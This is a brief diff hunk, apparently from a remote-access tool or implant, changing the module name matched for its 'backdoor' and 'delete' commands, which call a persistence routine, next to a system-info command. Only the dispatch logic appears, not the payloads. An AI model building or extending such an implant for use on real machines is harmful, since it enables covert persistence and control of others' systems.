@@ -489,7 +489,7 @@ def main():
                             if module == 'sysinfo' and action == 'get':
                                 get_system_info(s)
                                 continue
-                            if module == 'system' and action in ('backdoor','delete'):
+                            if module == 'System' and action in ('backdoor','delete'):
                                 if action == 'backdoor':
                                     add_persistence(s)
                                 else:
